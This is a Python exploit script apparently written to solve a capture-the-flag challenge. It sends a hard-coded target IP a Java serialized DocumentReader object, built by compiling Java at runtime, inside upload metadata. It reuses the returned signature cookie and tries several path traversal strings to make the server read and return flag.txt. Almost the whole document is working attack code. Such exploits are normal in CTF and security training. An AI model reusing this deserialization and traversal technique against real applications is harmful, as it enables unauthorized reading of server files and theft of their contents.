#!/usr/bin/env python3
"""
Exploit script for Deez CTF challenge
Uses Java deserialization with DocumentReader to read flag.txt
"""

import requests
import base64
import json
import subprocess
import os
import sys

# Target URL
TARGET = "http://103.31.39.30:8080"

def create_serialized_payload(file_path):
    """Create a serialized DocumentReader payload"""
    # Java code to serialize DocumentReader
    java_code = f"""
import java.io.*;
import java.util.Base64;

class DocumentReader implements Serializable {{
    private static final long serialVersionUID = 1L;
    private String path;

    public DocumentReader(String path) {{
        this.path = path;
    }}

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {{
        ois.defaultReadObject();
    }}

    @Override
    public String toString() {{
        try {{
            java.nio.file.Path p = java.nio.file.Paths.get(path);
            String content = new String(java.nio.file.Files.readAllBytes(p));
            return content;
        }} catch (IOException e) {{
            return "[ERROR reading file: " + e.getMessage() + "]";
        }}
    }}
}}

public class SerializePayload {{
    public static void main(String[] args) throws Exception {{
        DocumentReader reader = new DocumentReader("{file_path}");
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(reader);
        oos.close();
        String b64 = Base64.getEncoder().encodeToString(bos.toByteArray());
        System.out.println(b64);
    }}
}}
"""
    
    # Write Java file
    with open("SerializePayload.java", "w") as f:
        f.write(java_code)
    
    # Compile and run
    try:
        subprocess.run(["javac", "SerializePayload.java"], check=True, capture_output=True)
        result = subprocess.run(["java", "SerializePayload"], check=True, capture_output=True, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error: {e.stderr}")
        return None
    finally:
        # Cleanup
        for f in ["SerializePayload.java", "SerializePayload.class"]:
            if os.path.exists(f):
                os.remove(f)

def exploit():
    """Main exploit function"""
    # Try different paths
    paths = [
        "secret/flag.txt",
        "../secret/flag.txt",
        "../../secret/flag.txt",
        "dist/secret/flag.txt",
        "../dist/secret/flag.txt",
        "/app/secret/flag.txt",  # Docker path
        "/app/dist/secret/flag.txt"
    ]
    
    for path in paths:
        print(f"\n[*] Trying path: {path}")
        
        # Create payload
        print("[*] Creating serialized payload...")
        metadata_b64 = create_serialized_payload(path)
        
        if not metadata_b64:
            print("[!] Failed to create payload")
            continue
        
        # Get metadata from server (to get valid format)
        print("[*] Getting metadata format from server...")
        try:
            meta_res = requests.get(f"{TARGET}/api/metadata?author=test")
            if meta_res.status_code == 200:
                meta_json = meta_res.json()
                # We'll use our own payload instead
                pass
        except Exception as e:
            print(f"[!] Error getting metadata: {e}")
        
        # Create document
        print("[*] Uploading document with malicious metadata...")
        payload = {
            "filename": "exploit.txt",
            "content": base64.b64encode(b"test content").decode(),
            "metadata": metadata_b64
        }
        
        try:
            res = requests.post(f"{TARGET}/api/upload", json=payload)
            if res.status_code != 200:
                print(f"[!] Upload failed: {res.status_code}")
                print(f"Response: {res.text}")
                continue
            
            result = res.json()
            if "viewer" not in result:
                print(f"[!] No viewer URL: {result}")
                continue
            
            viewer_url = result["viewer"]
            doc_id = viewer_url.split("/")[-1]
            
            # Get signature cookie
            signature = res.cookies.get("signature")
            if not signature:
                print("[!] No signature cookie received")
                continue
            
            print(f"[*] Document ID: {doc_id}")
            print(f"[*] Signature: {signature}")
            print(f"[*] Viewing document...")
            
            # View document (this triggers toString() and file read)
            cookies = {"signature": signature}
            view_res = requests.get(f"{TARGET}{viewer_url}", cookies=cookies)
            
            if view_res.status_code == 200:
                # Check if flag is in response
                if "BPJS{" in view_res.text:
                    print("\n[+] FLAG FOUND!")
                    print(view_res.text)
                    # Extract flag
                    import re
                    flag_match = re.search(r'BPJS\{[^}]+\}', view_res.text)
                    if flag_match:
                        print(f"\n[+] FLAG: {flag_match.group(0)}")
                        return flag_match.group(0)
                else:
                    print("[*] Response received, checking for flag...")
                    # Print metadata section
                    if "metadata" in view_res.text.lower():
                        print("[*] Check the metadata field in the response")
            else:
                print(f"[!] View failed: {view_res.status_code}")
                print(f"Response: {view_res.text[:500]}")
                
        except Exception as e:
            print(f"[!] Error: {e}")
            import traceback
            traceback.print_exc()
    
    print("\n[!] Exploit failed for all paths")
    return None

if __name__ == "__main__":
    exploit()

